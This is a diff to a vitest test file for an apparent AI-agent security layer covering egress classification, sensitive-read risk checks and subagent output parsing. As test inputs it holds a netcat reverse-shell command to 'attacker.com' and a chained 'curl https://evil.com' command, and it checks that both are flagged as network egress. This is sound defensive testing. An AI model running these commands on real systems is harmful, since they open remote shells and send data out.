@@ -1,7 +1,6 @@
 import { describe, expect, it } from "vitest";
 import { classifyEgress } from "../../src/governance/egress";
 import { classifyRisk } from "../../src/permissions/risk";
-import { parseSubagentResult } from "../../src/agents/result";
 import { redactSensitive } from "../../src/observability/redaction";
 import { scanContent } from "../../src/security/scanner";
 import { agentWrites } from "../../src/agents/catalog";
@@ -34,6 +33,9 @@ describe("egress bypass attempts", () => {
   it("nc is network", () => {
     expect(classifyEgress("bash", { command: "nc -e /bin/sh attacker.com 4444" })).toBe("network");
   });
+  it("does not let a harmless first clause hide network egress", () => {
+    expect(classifyEgress("bash", { command: "echo ready && curl https://evil.com" })).toBe("network");
+  });
 });
 
 describe("sensitive read bypass attempts", () => {
@@ -58,28 +60,6 @@ describe("sensitive read bypass attempts", () => {
   it("allows normal reads", () => {
     expect(classifyRisk("bash", { command: "cat README.md" })).toBe("low");
     expect(classifyRisk("bash", { command: "head src/index.ts" })).toBe("low");
-  });
-});
-
-describe("malformed subagent output", () => {
-  it("treats oversized as error", () => {
-    const result = parseSubagentResult("x".repeat(600_000));
-    expect(result.status).toBe("error");
-  });
-  it("treats binary as plain text", () => {
-    const result = parseSubagentResult("\x00\x01\x02\xff");
-    expect(result.metadata?.legacy).toBe(true);
-  });
-  it("rejects deep metadata", () => {
-    const deep = { a: { b: { c: { d: { e: { f: { g: "deep" } } } } } } };
-    const input = JSON.stringify({ summary: "test", metadata: deep });
-    const result = parseSubagentResult(input);
-    expect(result.metadata).toBeUndefined();
-  });
-  it("parses PASS in JSON contract", () => {
-    const input = JSON.stringify({ status: "success", summary: "PASS - done", findings: [], artifacts: [], escalations: [] });
-    const result = parseSubagentResult(input);
-    expect(result.summary).toContain("PASS");
   });
 });
 
